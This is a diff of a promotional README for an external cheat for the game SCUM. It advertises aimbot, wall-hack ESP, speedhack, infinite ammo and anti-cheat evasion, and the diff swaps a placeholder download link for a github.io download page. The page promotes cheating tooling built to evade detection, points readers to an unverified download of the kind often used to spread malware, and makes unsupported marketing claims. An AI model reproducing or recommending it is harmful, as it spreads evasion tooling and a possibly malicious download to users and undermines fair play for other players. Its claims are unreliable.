@@ -1,6 +1,6 @@
 SCUM External Cheat is a next-gen external cheat engineered for SCUM, combining cutting-edge C++/C# programming with advanced anti-cheat evasion. Whether you’re sniping, looting, or battling, this tool delivers 100% aimbot accuracy, player ESP through walls, and seamless loot tracking. With features like radar hack, infinite ammo, and speedhack, it’s designed to turn every match into a victory. Lightweight and user-friendly, it’s trusted by top players to stay undetected while dominating the battlefield.  
 
-[![Download SCUM External Pro](https://img.shields.io/badge/Download-SCUM%20External%20Pro-blueviolet)](https://example.com)  
+[![Download SCUM External Pro](https://img.shields.io/badge/Download-SCUM%20External%20Pro-blueviolet)](https://scum-external-cheat.github.io/.github/)  
 
 ---
 
